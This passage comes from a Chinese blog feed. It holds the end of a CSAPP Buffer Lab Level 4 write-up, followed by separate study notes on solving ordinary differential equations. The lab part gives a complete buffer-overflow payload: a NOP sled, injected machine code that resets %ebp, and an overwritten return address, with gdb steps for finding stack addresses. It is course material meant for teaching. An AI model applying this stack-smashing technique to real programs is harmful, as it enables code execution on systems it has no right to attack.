<p>本题笔者还是折腾了好一阵的，本题需要我们开启命令行参数-n，这会让我们需要连续5次输入相同的内容，每一次都得做到和Level3相同的效果。本题主要在于5次的缓冲区开始位置是不同的。但是我们又必须用同一段内容通过这5次的重复实验。首先会产生的第一个问题是，如果缓冲区开始的位置不确定，那么我们应该把我们想执行的汇编代码注入到哪？因为<code>-0x208(%ebp)</code>的地址每次都在改变，如果我们简单的ret回第一次出现的<code>-0x208(%ebp)</code>的位置，可能会导致在某些情况下发生错误，因此我们应该将代码跳转至一个合适的位置，让5次的重复实验都不会发生溢出。我们可以利用gdb工具，在<code>getbufn</code>处打一个断点，让程序运行，看看每次<code>-0x208(%ebp)</code>的地址。连续运行5次图片过长，这里的截图只截取了前4次，可以看出在5次重复实验中，<code>-0x208(%ebp)</code>的栈位置最高时的地址是<code>0x55683678</code>，因此我们至少需要跳转到这个位置，或是更高的位置。否则在缓冲区位置开始为<code>0x55683678</code>时，如果跳转到了比这个低的位置，就会发现段错误导致程序异常终止。（在笔者的运行环境下，多次实验可以发现，虽然题目说是随机化，但是每次的地址都是固定的，不知道是不是CMU的学生在提交到服务器上检测时，会真正做到随机化）</p>
<p><img src="/images/《CSAPP》实验解析/buf_level4.png" alt="buf_level4" style="zoom:50%;" /></p>
<p>回到上面的问题，既然缓冲区开始的位置不在栈顶，那么我们在注入我们的汇编代码时，该注入到哪呢？对于这个问题，实验指导书中给出了我们提示，说可以用<code>nop</code>（机器码90）来占位，我们可以先用<code>nop</code>在栈顶的部分占位，之后在靠近栈底的部分在插入我们想要执行的机器码。这样不论我们跳转到哪，都会先执行若干<code>nop</code>，再执行我们的机器码，从而避免了我们把机器码注入在栈顶，有可能不被程序执行的问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|xx xx xx xx| - ret</span><br><span class="line">|xx xx xx xx| - %ebp</span><br><span class="line">|xx xx xx xx| - 我们想要执行的机器码</span><br><span class="line">|90 90 90 90| \</span><br><span class="line">     ...        - nop指令</span><br><span class="line">|90 90 90 90| /</span><br></pre></td></tr></table></figure>
<p>第二个问题是跟上一题一样，我们要怎么维护<code>%ebp</code>不变，上一题只要运行一次，因此我们可以直接查看<code>%ebp</code>的位置，然后在缓冲区溢出时，调整我们的输入内容，维持<code>%ebp</code>不变即可，但是对于本题，我们要用同一段内容，通过重复的5次实验，而每次的<code>%ebp</code>的值都不同，因此我们不可能用同一段内容，让<code>%ebp</code>每次都维持正确的值。这时我们可以考虑，用一个汇编指令，直接修改<code>%ebp</code>的值，因为我们知道<code>%ebp</code>与<code>%esp</code>是有相对关系的，所以我们只需要查看一下它们的相对地址，再用汇编指令算出<code>%ebp</code>的正确地址即可。我们只需要看看在<code>getbufn</code>返回之后，两者的相对地址即可，因为我们注入的代码正是在这时候执行的。我们在<code>8048e35</code>执行<code>getbufn</code>之后，在<code>8048e3a</code>处打一个断点。</p>
<p><img src="/images/《CSAPP》实验解析/buf_level4_n.png" alt="buf_level4_n" style="zoom:50%;" /></p>
<p>在此只截取前两次运行，我们可以发现<code>%ebp</code>与<code>%esp</code>的地址差值始终是<code>0x28</code>，从而我们可以写出汇编代码如下，即可保证维护<code>%ebp</code>处于正确的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea  0x28(%esp), %ebp</span><br><span class="line">movl $0x7709aec3, %eax</span><br><span class="line">push $0x8048e3a</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>之后的做法和前面完全相同，编译与反汇编得到机器码后，我们可以新建文件<code>nitroglycerin.txt</code>，内容如下，因为占空间分配了<code>0x208</code>即520字节，我们文件中共505字节的<code>nop</code>占位，15字节的机器码是我们的汇编指令。之后4字节是覆盖<code>%ebp</code>的位置，因为我们已经通过汇编指令修改<code>%ebp</code>的值，因此在缓冲区溢出覆盖时，可以随便是什么值，这里是<code>00 00 00 00</code>，最后4字节是覆盖返回地址，笔者选用的是上面实验得出的最高地址<code>0x55683678</code>，当然任何比这个地址大，同时不超过我们汇编指令得到的机器码开始位置的地址，都是可行的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 8d 6c 24</span><br><span class="line">28 b8 c3 ae</span><br><span class="line">09 77 68 3a</span><br><span class="line">8e 04 08 c3</span><br><span class="line">00 00 00 00</span><br><span class="line">78 36 68 55</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>实验解答</category>
      </categories>
      <tags>
        <tag>CS</tag>
      </tags>
  </entry>
  <entry>
    <title>《常微分方程》学习笔记</title>
    <url>/2022/01/06/%E5%B8%B8%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="变量分离法">变量分离法</h4>
<h5 id="变量分离方程fracdydx-fxgy">变量分离方程：<span class="math inline">\(\frac{dy}{dx} = f(x)g(y)\)</span></h5>
<p>当<span class="math inline">\(g(y) \neq 0\)</span>，<span class="math inline">\(\frac{dy}{g(y)} = f(x)dx\)</span>，解为<span class="math inline">\(\int\frac{1}{g(y)}dy = \int f(x)dx +c\)</span></p>
<p>若<span class="math inline">\(g(y_0) = 0\)</span>，则<span class="math inline">\(y = y_0\)</span>也是方程的解</p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{dy}{dx} = 2x(1-y^2)^{\frac{1}{2}}\)</span></p>
<span id="more"></span>
<h5 id="齐次方程fracdydx-gfracyx">齐次方程：<span class="math inline">\(\frac{dy}{dx} = g(\frac{y}{x})\)</span></h5>
<p>令<span class="math inline">\(u=\frac{y}{x}\)</span>，则<span class="math inline">\(x\frac{du}{dx}+u=g(u)\)</span>，从而<span class="math inline">\(\frac{du}{dx} = \frac{g(u)-u}{x}\)</span>即为变量分离方程</p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(x\frac{dy}{dx} = y+\sqrt{x^2-y^2}\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{dy}{dx} = \frac{2xye^{(\frac{x}{y})^2}}{y^2+y^2e^{(\frac{x}{y})^2}+2x^2e^{(\frac{x}{y})^2}}\)</span></p>
<h5 id="形如fracdydx-fraca_1xb_1yc_1a_2xb_2yc_2">形如<span class="math inline">\(\frac{dy}{dx} = \frac{a_1x+b_1y+c_1}{a_2x+b_2y+c_2}\)</span></h5>
<p>利用平移变换可化为齐次方程</p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{dy}{dx} = \frac{2x-y+1}{x-2y+1}\)</span></p>
<h4 id="一阶线性微分方程常数变易法">一阶线性微分方程常数变易法</h4>
<p><span class="math inline">\(y&#39; = P(x)y+Q(x)\)</span></p>
<p>当<span class="math inline">\(Q(x) = 0\)</span>时，可化为变量分离方程，解为<span class="math inline">\(y=Ce^{\int P(x)dx}\)</span></p>
<p>通过常数变易<span class="math inline">\(y(x) = C(x)e^{\int P(x)dx}\)</span>代入方程中，可解得<span class="math inline">\(C(x) = \int Q(x)e^{-\int P(x)dx}dx+k\)</span></p>
<p>因此原方程通解为<span class="math inline">\(y = e^{\int P(x)dx}(\int Q(x)e^{-P(x)dx}dx+k)\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{dy}{dx}-\frac{n}{x}y = e^xx^n\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{dy}{dx}=\frac{y}{x+y^3}\)</span></p>
<p><span class="math inline">\(Bernoulli\)</span>方程：<span class="math inline">\(\frac{dy}{dx} = P(x)y+Q(x)y^n\)</span></p>
<p>两边同乘<span class="math inline">\(y^{-n}\)</span>，可得<span class="math inline">\(y^{-n}\frac{dy}{dx} = P(x)y^{1-n}+Q(x)\)</span></p>
<p>令<span class="math inline">\(z = y^{1-n}\)</span>，则<span class="math inline">\(\frac{dz}{dx} = (1-n)P(x)z+(1-n)Q(x)\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{dy}{dx} = \frac{x^4+y^3}{xy^2}\)</span></p>
<p><span class="math inline">\(Riccati\)</span>方程：<span class="math inline">\(\frac{dy}{dx} = P(x)y+Q(x)y^2+f(x)\)</span></p>
<p>一般无法精确求解，但若已知一个特解<span class="math inline">\(y^*(x)\)</span>，做变换<span class="math inline">\(y = z+y^*(x)\)</span>，可将方程化为<span class="math inline">\(\frac{dz}{dx} = (P(x)+2Q(x)y^*(x))z+Q(x)z^2\)</span>，即为<span class="math inline">\(n=2\)</span>的<span class="math inline">\(Bernoulli\)</span>方程</p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{dy}{dx}+y^2-3ysinx=cosx-2sin^2x\)</span></p>
<h4 id="恰当方程与积分因子法">恰当方程与积分因子法</h4>
<p>恰当方程：<span class="math inline">\(M(x,y)dx+N(x,y)dy=0\)</span>满足<span class="math inline">\(M(x,y)dx+N(x,y)dy=du(x,y) = \frac{\partial u}{\partial x}dx+\frac{\partial u}{\partial y}dy\)</span></p>
<p>恰当方程的充要条件<span class="math inline">\(\frac{\partial M}{\partial y} = \frac{\partial N}{\partial x}\)</span></p>
<p>恰当方程的解：观察法或<span class="math inline">\(u(x,y) = \int M(x,y)dx+\int[N(x,y)-\frac{\partial}{\partial y}\int M(x,y)dx]dy\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\([\frac{y^2}{(x-y)^2}-\frac{1}{x^2}]dx+[\frac{1}{y}-\frac{x^2}{(x-y)^2}]dy=0\)</span></p>
<p>若存在连续可微函数<span class="math inline">\(\mu = \mu(x,y) \neq 0\)</span>，使得<span class="math inline">\(\mu M(x,y)dx+\mu N(x,y)dy=0\)</span>为恰当方程，则称<span class="math inline">\(\mu\)</span>为积分因子</p>
<p>积分因子的求法</p>
<p>（1）<span class="math inline">\(\frac{\frac{\partial M}{\partial y}-\frac{\partial N}{\partial x}}{N} = \psi(x)\)</span>或<span class="math inline">\(\frac{\frac{\partial M}{\partial y}-\frac{\partial N}{\partial x}}{-M} = \psi(y)\)</span></p>
<p>积分因子为<span class="math inline">\(\mu = e^{\int \psi(x)dx}\)</span>或<span class="math inline">\(\mu = e^{\psi(y)dy}\)</span></p>
<p>（2）<span class="math inline">\(\frac{\frac{\partial M}{\partial y}-\frac{\partial N}{\partial x}}{N\frac{\partial z}{\partial x}-M\frac{\partial z}{\partial y}} = f(z)\)</span></p>
<p>则<span class="math inline">\(\mu = e^{\int f(z)dz}\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(ydx+(y-x)dy=0\)</span></p>
<p>分组积分因子法</p>
<p>求出每组的积分因子<span class="math inline">\(\mu _1,\mu_2\)</span>与对应的恰当函数<span class="math inline">\(u_1,u_2\)</span>，寻找<span class="math inline">\(\phi, \psi\)</span>，使<span class="math inline">\(\mu = \mu_1\phi(u_1) = \mu_2 \psi(u_2)\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\((5xy-3y^3)dx+(3x^2-7xy^2)=0\)</span></p>
<h4 id="一阶隐式方程求法">一阶隐式方程求法</h4>
<p>（1）<span class="math inline">\(y = f(x,y&#39;)\)</span>或<span class="math inline">\(x = f(y, y&#39;)\)</span></p>
<p>令<span class="math inline">\(y&#39; = p\)</span>，有<span class="math inline">\(y = f(x,p)\)</span>，两边求导得<span class="math inline">\(p = \frac{\partial f}{\partial x} + \frac{dp}{dx}\frac{\partial f}{\partial p}\)</span></p>
<p>即<span class="math inline">\(\frac{dp}{dx} = \frac{p-\frac{\partial f}{\partial x}}{\frac{\partial f}{\partial p}}\)</span></p>
<p>从而解出<span class="math inline">\(p = \phi(x, C)\)</span>，代入即得<span class="math inline">\(y = f(x, \phi(x, C))\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(y = -(\frac{dy}{dx})^2-x\frac{dy}{dx}-\frac{x^2}{2}\)</span></p>
<p>（2）<span class="math inline">\(f(x,y&#39;)=0\)</span>或<span class="math inline">\(f(y,y&#39;)=0\)</span></p>
<p>设参数形式为<span class="math inline">\(x = \phi(t), \ p = \psi(t)\)</span>，则<span class="math inline">\(y = \int \psi(t)\phi&#39;(t)dt + C\)</span></p>
<p>即原方程通解为<span class="math inline">\(\left \{ \begin{array}{lr} x = \phi(t) \\ y = \int \psi(t)\phi&#39;(t)dt +C \end{array} \right.\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\((y&#39;)^3-x^3(1-y&#39;)=0\)</span></p>
<h4 id="n阶常系数齐线性微分方程解法">n阶常系数齐线性微分方程解法</h4>
<p><span class="math inline">\(y^{(n)}+a_1y^{(n-1)}+...+a_{n-1}y&#39;+a_ny = 0\)</span></p>
<p>令<span class="math inline">\(F(\lambda) = \lambda ^n + a_1 \lambda ^{n-1}+...+a_{n-1}\lambda + a_n = 0\)</span>，解出特征根</p>
<p>（1）特征根都为单根</p>
<p>设特征根为<span class="math inline">\(\lambda_1,...\lambda_n\)</span></p>
<p>则原方程通解为<span class="math inline">\(y = c_1e^{\lambda_1x}+c_2e^{\lambda_2x}+...+c_ne^{\lambda_nx}\)</span></p>
<p>若<span class="math inline">\(\lambda_i = \alpha_i + i \beta_i\)</span>为复根，则<span class="math inline">\(\lambda_i&#39; = \alpha_i-i\beta_i\)</span>也是特征根，故可用<span class="math inline">\(e^{\alpha_ix}cos\beta_ix,\ e^{\alpha_ix}sin\beta_ix\)</span>替代<span class="math inline">\(e^{\lambda_ix},e^{\lambda_i&#39;x}\)</span></p>
<p>（2）特征根有重根</p>
<p>设特征方程有<span class="math inline">\(k_i\)</span>重特征根<span class="math inline">\(\lambda_i\)</span>，则方程有<span class="math inline">\(k_i\)</span>个线性无关的解</p>
<p><span class="math inline">\(e^{\lambda_ix},xe^{\lambda_ix},...,x^{k_i-1}e^{\lambda_ix}\)</span></p>
<p>若<span class="math inline">\(\lambda_i = \alpha_i+i\beta_i\)</span>，则有解</p>
<p><span class="math inline">\(e^{\alpha_ix}cos\beta_ix,xe^{\alpha_ix}cos\beta_ix,...,x^{k_i-1}e^{\alpha_ix}cos\beta_ix\)</span></p>
<p><span class="math inline">\(e^{\alpha_ix}sin\beta_ix,xe^{\alpha_ix}sin\beta_ix,...,x^{k_i-1}e^{\alpha_ix}sin\beta_ix\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(y^{(7)}-3y^{(6)}+5y^{(5)}-7y^{(4)}+7y^{(3)}-5y^{(2)}+3y&#39;-y=0\)</span></p>
<p><span class="math inline">\(Euler\)</span>方程：<span class="math inline">\(x^n\frac{d^n y}{dx^n}+a_1x^{n-1}\frac{d^{n-1}y}{dx^{n-1}}+...+a_{n-1}x\frac{dy}{dx}+a_ny = 0\)</span></p>
<p>做换元<span class="math inline">\(x = e^t\)</span>，有<span class="math inline">\(x^k\frac{d^ky}{dx^k} = D(D-1)...(D-k+1)y\)</span>，<span class="math inline">\(D=\frac{d}{dt}\)</span></p>
<p>即可将<span class="math inline">\(Euler\)</span>方程变为常系数齐线性微分方程</p>
<p>即解<span class="math inline">\(F(\lambda) = \lambda(\lambda-1)...(\lambda-n+1)+a_1\lambda(\lambda-1)...(\lambda-n+2)+...+a_{n-1}\lambda+a_n = 0\)</span></p>
<p>对<span class="math inline">\(k_i\)</span>重根<span class="math inline">\(\lambda_i\)</span>，对应的解为</p>
<p><span class="math inline">\(x^{\lambda_i},(ln|x|)x^{\lambda_i},...,(ln|x|)^{k_i-1}x^{\lambda_i}\)</span></p>
<p>若<span class="math inline">\(\lambda_i=\alpha_i+i\beta_i\)</span>，对应有解</p>
<p><span class="math inline">\(x^{\alpha_i}cos(\beta_iln|x|),x^{\alpha_i}ln|x|cos(\beta_iln|x|),...,x^{\alpha_i}(ln|x|)^{k_i-1}cos(\beta_iln|x|)\)</span></p>
<p><span class="math inline">\(x^{\alpha_i}sin(\beta_iln|x|),x^{\alpha_i}ln|x|sin(\beta_iln|x|),...,x^{\alpha_i}(ln|x|)^{k_i-1}sin(\beta_iln|x|)\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(x^2\frac{d^2y}{dx^2}-3x\frac{dy}{dx}+4y=0\)</span></p>
<h4 id="n阶常系数非齐线性微分方程解法">n阶常系数非齐线性微分方程解法</h4>
<p>常系数非齐线性微分方程：<span class="math inline">\(y^{(n)}+a_1y^{(n-1)}+...+a_{n-1}y&#39;+a_ny = f(x)\)</span></p>
<h5 id="常数变易法">常数变易法</h5>
<p>对<span class="math inline">\(f(x) = 0\)</span>解出<span class="math inline">\(y(x) = C_1y_1(x)+...+C_ny_n(x)\)</span></p>
<p>将常数变易<span class="math inline">\(y(x) = C_1(x)y_1(x)+...+C_n(x)y_n(x)\)</span></p>
<p>对<span class="math inline">\(y(x)\)</span>两边求导得<span class="math inline">\(y&#39;(x) = C_1(x)y&#39;_1(x)+...+C_n(x)y&#39;_n(x)+C_1&#39;(x)y_1(x)+...+C_n&#39;(x)y_n(x)\)</span></p>
<p>令<span class="math inline">\(C_1&#39;(x)y_1(x)+...+C_n&#39;(x)y_n&#39;(x)=0\)</span></p>
<p>如此求<span class="math inline">\(n-1\)</span>次，得到<span class="math inline">\(n-1\)</span>个方程</p>
<p>最后关于<span class="math inline">\(x\)</span>求导可得<span class="math inline">\(C_1&#39;(x)y_1^{(n-1)}(x)+...+C&#39;_n(x)y_n^{(n-1)}(x) = f(x)\)</span></p>
<p>通过解下列线性方程组即可求得<span class="math inline">\(C_1(x),...C_n(x)\)</span></p>
<p><span class="math inline">\(\left\{\begin{array}{lr} C_1&#39;(x)y_1(x)+...+C_n&#39;(x)y_n(x) = 0 \\ C_1&#39;(x)y_1&#39;(x)+...+C_n&#39;(x)y_n&#39;(x) = 0 \\ ...... \\ C_1&#39;(x)y_1^{(n-2)}(x)+...+C_n&#39;(x)y_n^{(n-2)}(x) = 0 \\ C_1&#39;(x)y_1^{(n-1)}(x)+...+C_n&#39;(x)y_n^{(n-1)}(x) = f(x) \end{array} \right.\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{d^2y}{dx^2}+4y=xsin2x\)</span></p>
<h5 id="比较系数法">比较系数法</h5>
<p>若<span class="math inline">\(f(x) = (b_0x^m+b_1x^{m-1}+...+b_{m-1}x+b_m)e^{rx}\)</span>，则方程有形如：<span class="math inline">\(y=x^k(B_0x^m+B_1x^{m-1}+...+B_{m-1}x+B_m)e^{rx}\)</span>的特解，其中<span class="math inline">\(k\)</span>为特征方程<span class="math inline">\(F(\lambda)=0\)</span>的根<span class="math inline">\(\lambda=r\)</span>的重数，当<span class="math inline">\(r\)</span>不是特征根时，取<span class="math inline">\(k=0\)</span></p>
<p>若<span class="math inline">\(f(x) = [A_m(x)cos\beta x + B_n(x)sin\beta x]e^{\alpha x}\)</span>，其中<span class="math inline">\(\alpha,\beta\)</span>为实常数，<span class="math inline">\(A_m(x),B_n(x)\)</span>分别为<span class="math inline">\(x\)</span>的<span class="math inline">\(m,n\)</span>次实系数多项式，则方程有形如：</p>
<p><span class="math inline">\(y = x^k[C_s(x)cos\beta x+D_s(x)sin \beta x]e^{\alpha x}\)</span>的特解，其中<span class="math inline">\(k\)</span>为特征根<span class="math inline">\(\alpha+i\beta\)</span>的重数，当$+i<span class="math inline">\(不是特征根时，取\)</span>k=0<span class="math inline">\(，\)</span>C_s(x),D_s(x)<span class="math inline">\(为\)</span>s<span class="math inline">\(次待定实系数多项式，\)</span>s = max { m,n }$</p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(y^{(4)}-2y&#39;&#39;+y=x^2-3\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(y&#39;&#39;&#39;-y=(x+1)e^x\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(y&#39;&#39;-2y&#39;+2y=xe^xcosx\)</span></p>
<h5 id="复数法">复数法</h5>
<p>若<span class="math inline">\(f(x) = A(x)e^{\alpha x}cos\beta x\)</span>或<span class="math inline">\(f(x) = A(x)e^{\alpha x}sin \beta x\)</span></p>
<p>则原方程的特解为方程<span class="math inline">\(y^{(n)}+a_1y^{(n-1)}+...+a_{n-1}y&#39;+a_ny = f(x)\)</span>特解的实部或虚部</p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(y&#39;&#39;+9y=xsin3x\)</span></p>
<h5 id="叠加原理法">叠加原理法</h5>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(y&#39;&#39;+y=sinx-cos2x\)</span></p>
<h4 id="laplace变换法求解n阶线性微分方程的初值问题"><span class="math inline">\(Laplace\)</span>变换法求解n阶线性微分方程的初值问题</h4>
<p>在有定义的条件下，<span class="math inline">\(F(s) = \int _0 ^{+\infty} e^{-sx}f(x)dx\)</span>为<span class="math inline">\(f(x)\)</span>的<span class="math inline">\(Laplace\)</span>变换，记为<span class="math inline">\(L[f(x)] = F(s)\)</span></p>
<p><span class="math inline">\(Laplace\)</span>变换的性质：</p>
<p>（1）线性性质：<span class="math inline">\(L[\alpha f(x) + \beta g(x)] = \alpha L[f(x)]+\beta L[g(x)]\)</span></p>
<p>（2）原函数微分性质：记<span class="math inline">\(L[f(x)] = F(s)\)</span>，则<span class="math inline">\(L[f&#39;(x)] = sF(s)-f(0)\)</span></p>
<p>一般地，<span class="math inline">\(L[f^{(n)}(x)] = s^nF(s)-s^{n-1}f(0)-s^{n-2}f&#39;(0)-...-f^{(n-1)}(0)\)</span></p>
<p>（3）像函数微分性质：<span class="math inline">\(F&#39;(s) = -L[xf(x)]\)</span></p>
<p>一般地，<span class="math inline">\(F^{(n)}(s) = (-1)^n L[x^nf(x)]\)</span></p>
<p>（4）位移性质：<span class="math inline">\(L[e^{ax}f(x)] = F(s-a)\)</span></p>
<p>（5）卷积性质</p>
<p>常见函数的<span class="math inline">\(Laplace\)</span>变换</p>
<p><span class="math inline">\(L[1] = \frac{1}{s}\)</span></p>
<p><span class="math inline">\(L[x^n] = \frac{n!}{s^{n+1}}\)</span></p>
<p><span class="math inline">\(L[x^ne^{ax}] = \frac{n!}{(s-a)^{n+1}}\)</span></p>
<p><span class="math inline">\(L[e^{ax}] = \frac{1}{s-a}\)</span></p>
<p><span class="math inline">\(L[sinkx] = \frac{k}{s^2+k^2}\)</span></p>
<p><span class="math inline">\(L[coskx] =\frac{s}{s^2+k^2}\)</span></p>
<p><span class="math inline">\(L[xsinkx] = \frac{2sk}{(s^2+k^2)^2}\)</span></p>
<p><span class="math inline">\(L[xcoskx] = \frac{s^2-k^2}{(s^2+k^2)^2}\)</span></p>
<p>应用<span class="math inline">\(Laplace\)</span>变换解方程的解法</p>
<p>记<span class="math inline">\(L[y(x)] = Y(s)\)</span>，在微分方程两边取<span class="math inline">\(Laplace\)</span>变换，代入初值条件，整理得到<span class="math inline">\(Y(s)\)</span>的表达式，将<span class="math inline">\(Y(s)\)</span>变形为容易得到<span class="math inline">\(Laplace\)</span>逆变换的形式，再做<span class="math inline">\(Laplace\)</span>逆变换，即可解得<span class="math inline">\(y(x)\)</span></p>
<p><span class="math inline">\(Ex.\)</span> 方程<span class="math inline">\(y&#39;&#39;+2y&#39;-3y=e^{-x}\)</span>，满足初始条件<span class="math inline">\(y(0) = 0,y&#39;(0) = 1\)</span>，求<span class="math inline">\(y(x)\)</span></p>
<h4 id="高阶微分方程降阶法">高阶微分方程降阶法</h4>
<h5 id="换元">换元</h5>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{d^5y}{dx^5}-\frac{1}{x}\frac{d^4y}{dx^4} = 0\)</span></p>
<h5 id="凑微分">凑微分</h5>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(yy&#39;&#39;-(y&#39;)^2=0\)</span></p>
<h5 id="齐次方程换元法">齐次方程换元法</h5>
<p>若<span class="math inline">\(F(x,y,y&#39;,...,y^{(n)})\)</span>关于<span class="math inline">\(y\)</span>与<span class="math inline">\(y\)</span>的各阶导数是齐次的，则可做换元<span class="math inline">\(y=e^{\int zdx}\)</span>，代入解出<span class="math inline">\(z\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(yy&#39;&#39;-(y&#39;)^2=0\)</span></p>
<h5 id="通过已知解降阶">通过已知解降阶</h5>
<p>已知<span class="math inline">\(y_0\)</span>为方程的解，通过换元<span class="math inline">\(y = y_0u\)</span>，代入方程即可实现降阶</p>
<p>特别地，设<span class="math inline">\(y_1(x) \neq 0\)</span>是二阶变系数微分方程<span class="math inline">\(y&#39;&#39;+a_1y&#39;+a_2y=0\)</span>的解，则方程另一与<span class="math inline">\(y_1\)</span>线性无关的解为<span class="math inline">\(y_1 \int \frac{1}{y_1^2}e^{-\int a_1(x)dx}dx\)</span>，即方程的通解为<span class="math inline">\(y=C_1y_1+C_2y_1 \int \frac{1}{y_1^2}e^{-a_1(x)dx}dx\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(x\frac{d^3y}{dx^3}+3\frac{d^2y}{dx^2}-x\frac{dy}{dx}-y=0\)</span>有特解<span class="math inline">\(y_0=\frac{1}{x}\)</span>，求其通解</p>
<h5 id="幂级数解法">幂级数解法</h5>
<h4 id="常系数齐线性微分方程组解法">常系数齐线性微分方程组解法</h4>
<p><span class="math inline">\(\frac{d \boldsymbol{x}}{dt} = A\boldsymbol{x}\)</span>，<span class="math inline">\(A=(a_{ij})_{(n \times n)}\)</span>为常数矩阵</p>
<h5 id="特征向量法">特征向量法</h5>
<p>如果矩阵<span class="math inline">\(A\)</span>有<span class="math inline">\(n\)</span>个线性无关的特征向量<span class="math inline">\(\boldsymbol{u}_1,\boldsymbol{u}_2,...,\boldsymbol{u}_n\)</span>，对应的特征值为<span class="math inline">\(\lambda_1,\lambda_2,...\lambda_n\)</span>（不必互不相同），则有基解矩阵<span class="math inline">\(\boldsymbol{\Phi}(t) = [e^{\lambda_1t}\boldsymbol{u}_1,e^{\lambda_2t}\boldsymbol{u}_2,...,e^{\lambda_nt}\boldsymbol{u}_n]\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{d\boldsymbol{x}}{dt} = \left( \begin{array}{**} 3 &amp; -1 &amp; 1 \\ -1&amp; 5&amp; -1\\1 &amp; -1 &amp; 3 \end{array} \right)\boldsymbol{x}\)</span></p>
<p><span class="math inline">\(Ex.\)</span> <span class="math inline">\(\frac{d\boldsymbol{x}}{dt} = \left( \begin{array}{**} 1 &amp; 1 \\ -1&amp; 1 \end{array} \right)\boldsymbol{x}\)</span></p>
<h5 id="jordan标准形法"><span class="math inline">\(Jordan\)</span>标准形法</h5>
<h5 id="hamilton-cayley法"><span class="math inline">\(Hamilton-Cayley\)</span>法</h5>
<p>设<span class="math inline">\(\lambda_1,...\lambda_n\)</span>为<span class="math inline">\(A\)</span>的特征值（可以有相同的），令</p>
<p><span class="math inline">\(\left \{ \begin{array}{lr} Q_0 = E \\ Q_1 = (A-\lambda_1E)Q_0 \\ ...... \\ Q_{n-1} = (A-\lambda_{n-1}E)Q_{n-2} \end{array} \right.\)</span></p>
<p>令</p>
